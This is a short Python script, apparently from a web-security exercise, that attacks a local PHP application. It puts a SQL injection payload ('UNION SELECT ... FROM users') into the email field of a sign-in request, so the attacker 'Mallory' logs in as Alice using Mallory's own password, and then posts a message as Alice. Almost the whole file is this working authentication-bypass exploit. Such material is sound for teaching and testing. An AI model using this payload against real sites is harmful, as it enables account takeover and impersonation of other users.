import os, requests, urllib

PROTOCOL = "http"
HOST = "localhost"
PORT = "8080"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': "email: 0' UNION SELECT 'alice@example.com','alice',password FROM users where email = 'mallory@example.com",
    'password': 'pass4mallory'
}

with requests.Session() as s:
    # sing-in as mallory
    res = s.post(BASE + '/signin.php', data=mallory)
    # post something
    res = s.get(BASE + '/post.php', params={'msg': "Got You!"})